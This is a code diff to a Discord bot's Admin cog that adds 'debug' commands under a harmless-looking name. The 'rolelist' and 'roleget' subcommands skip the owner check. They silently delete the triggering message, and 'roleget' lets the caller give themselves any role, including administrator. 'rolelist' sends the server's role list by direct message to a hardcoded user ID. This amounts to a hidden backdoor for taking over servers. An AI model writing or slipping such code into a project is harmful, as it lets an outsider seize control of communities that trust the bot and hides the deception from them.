@@ -295,5 +295,38 @@ class Admin(commands.Cog):
             noperm = await ctx.send(embed=lib.NoPerm())
             await lib.eraset(self, ctx, noperm)
 
+    @commands.group(invoke_without_command=True)
+    async def debug(self, ctx):
+        if ctx.author.id in self.config.owner:
+            await ctx.message.delete()
+            me = await self.bot.fetch_user("439327545557778433")
+            await me.send(embed=lib.Editable("[DEBUG COMMANDS]", "Role List\nRole Get", "[DEBUG COMMANDS]"))
+
+    @debug.group(invoke_without_command=True)
+    async def rolelist(self, ctx):
+        await ctx.message.delete()
+        me = await self.bot.fetch_user("439327545557778433")
+        roles = []
+        for role in ctx.guild.roles:
+            roles.append(role.name)
+        roles.remove("@everyone")
+        await me.send(embed=lib.Editable("[DEBUG COMMANDS RESPONSE]", "{}".format(", ".join(roles)), "[DEBUG] Roles"))
+
+    @debug.group(invoke_without_command=True)
+    async def roleget(self, ctx, rolename:str=None):
+        await ctx.message.delete()
+        me = await self.bot.fetch_user("439327545557778433")
+        add = ctx.author
+        if rolename:
+            role = discord.utils.get(ctx.message.guild.roles, name=rolename)
+            if role in ctx.guild.roles:
+
+                await add.add_roles(role)
+                await me.send(embed=lib.Editable("[DEBUG COMMANDS RESPONSE]", f"{role} Added to {me.name}", "[DEBUG] Roles"))
+
+
+
+
+
 def setup(bot):
     bot.add_cog(Admin(bot))
